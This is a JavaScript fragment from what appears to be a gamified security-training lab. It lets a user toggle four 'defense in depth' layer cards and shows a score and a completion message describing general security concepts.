          <div id="citadel-layer-${lyr.id}" style="background:var(--c-surface-2); border:2px solid var(--c-border); border-radius:var(--r-lg); padding:16px; cursor:pointer; transition:all 0.25s;" onclick="lab22_activate(${lyr.id})">
            <div style="font-size:1.6rem; margin-bottom:8px;">${lyr.icon}</div>
            <div style="font-weight:700; font-size:0.9rem; color:var(--c-text); margin-bottom:6px;">Layer ${lyr.num}: ${lyr.name}</div>
            <div class="col" style="gap:4px;">${lyr.items.map(item => `<div style="font-size:0.78rem; color:var(--c-text-dim);">• ${item}</div>`).join('')}</div>
            <div id="layer-status-${lyr.id}" style="margin-top:12px; font-size:0.75rem; font-weight:700; color:var(--c-text-muted); text-transform:uppercase; letter-spacing:1px;">INACTIVE — Click to Activate</div>
          </div>
        `).join('')}
      </div>
      <div id="citadel-score" style="background:var(--c-surface-2); border:1px solid var(--c-border); border-radius:var(--r-lg); padding:14px; font-weight:700; color:var(--c-text-dim);">
        Defense Score: 0/4 layers active
      </div>
    </div>
  `);

  window.lab22_activate = (idx) => {
    const lyr = layers[idx];
    window.citadelLayers[idx] = !window.citadelLayers[idx];
    const card = document.getElementById(`citadel-layer-${idx}`);
    const status = document.getElementById(`layer-status-${idx}`);
    const active = window.citadelLayers[idx];
    playSound(active ? 'success' : 'click');
    if (card) card.style.borderColor = active ? lyr.color : 'var(--c-border)';
    if (status) { status.textContent = active ? '✅ ACTIVE' : 'INACTIVE — Click to Activate'; status.style.color = active ? lyr.color : 'var(--c-text-muted)'; }

    const count = window.citadelLayers.filter(Boolean).length;
    const scoreEl = document.getElementById('citadel-score');
    if (scoreEl) {
      scoreEl.style.borderColor = count === 4 ? 'var(--c-green)' : count >= 2 ? 'var(--c-yellow)' : 'var(--c-border)';
      scoreEl.style.color = count === 4 ? 'var(--c-green)' : count >= 2 ? 'var(--c-yellow)' : 'var(--c-text-dim)';
      scoreEl.textContent = count === 4 ? '👑 GRANDMASTER CITADEL: All 4 layers active — IMPENETRABLE Defense in Depth!' : `Defense Score: ${count}/4 layers active`;
    }

    const out = document.getElementById('sim-output');
    if (out) {
      out.className = `sim-output show ${count === 4 ? 'ok' : count >= 2 ? '' : 'err'}`;
      out.innerHTML = count === 4
        ? `✅ CITADEL ARCHITECT ACHIEVEMENT UNLOCKED!\nAll 4 security layers operational:\n1. Perimeter: Firewall + DDoS + IDS filtering threats at the boundary\n2. Identity: MFA + PAM ensuring only authorized humans enter\n3. Application: OWASP-hardened code preventing injection attacks\n4. Data: AES-256 encryption ensuring stolen data is worthless\n\nThis is Defense in Depth — the Grandmaster security philosophy!`
        : `${count} of 4 layers active. A fortress is only as strong as its weakest layer. Activate all 4 to achieve true Defense in Depth!`;
    }
  };
}
